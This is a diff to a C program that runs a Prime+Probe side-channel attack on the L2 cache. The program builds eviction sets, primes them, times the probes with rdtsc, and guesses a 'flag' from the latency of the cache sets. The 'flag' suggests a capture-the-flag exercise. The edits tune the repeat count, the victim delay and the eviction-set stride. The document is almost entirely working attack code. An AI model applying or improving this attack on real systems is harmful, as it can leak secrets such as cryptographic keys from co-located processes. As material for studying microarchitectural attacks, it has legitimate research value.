@@ -6,7 +6,7 @@
 
 #define NUM_L2_CACHE_SETS 1024
 #define WAYS 16
-#define REPEATS 3000
+#define REPEATS 2000
 #define THRESHOLD 50
 
 // Read timestamp counter
@@ -33,16 +33,15 @@ char* get_buffer() {
     return buf;
 }
 
-// Build eviction set for one cache set
+// Build eviction set for one L2 cache set
 void get_partial_eviction_set(char *buf, char *eviction_set[WAYS], int set_index) {
-
     for (int i = 0; i < WAYS; i++) {
-        eviction_set[i] = buf + (set_index << 6) + (i << 16);
+        // stride = NUM_L2_CACHE_SETS * 64 = 1024 * 64 = 65536
+        eviction_set[i] = buf + set_index * 64 + i * 65536;
     }
 }
 
 int main() {
-
     char *buf = get_buffer();
     char *eviction_sets[NUM_L2_CACHE_SETS][WAYS];
 
@@ -54,12 +53,11 @@ int main() {
     volatile char tmp;
 
     while (1) {
-
         uint64_t scores[NUM_L2_CACHE_SETS] = {0};
 
         for (int r = 0; r < REPEATS; r++) {
 
-            // PRIME
+            // PRIME all sets
             for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
                 for (int j = 0; j < WAYS; j++) {
                     tmp = *(eviction_sets[set][j]);
@@ -68,31 +66,28 @@ int main() {
 
             asm volatile("mfence; lfence");
 
-            // Give victim time
-            usleep(50);
+            // Give victim time to run
+            usleep(20);
 
-            // PROBE
+            // PROBE all sets
             for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
-
                 uint64_t start = rdtsc();
 
-                 for (int j = 0; j < WAYS; j++) {
+                for (int j = 0; j < WAYS; j++) {
                     tmp = *(eviction_sets[set][j]);
                 }
 
                 uint64_t end = rdtsc();
-
                 scores[set] += (end - start);
             }
         }
 
+        // Find set with max average latency
         int guessed_flag = -1;
         uint64_t max_score = 0;
 
         for (int i = 0; i < NUM_L2_CACHE_SETS; i++) {
-
             uint64_t avg = scores[i] / REPEATS;
-
             if (avg > max_score) {
                 max_score = avg;
                 guessed_flag = i;
@@ -102,7 +97,7 @@ int main() {
         printf("Guessed flag: %d (latency=%lu)\n", guessed_flag, max_score);
         fflush(stdout);
 
-        usleep(300000);
+        usleep(300000); // short pause before next iteration
     }
 
     return 0;
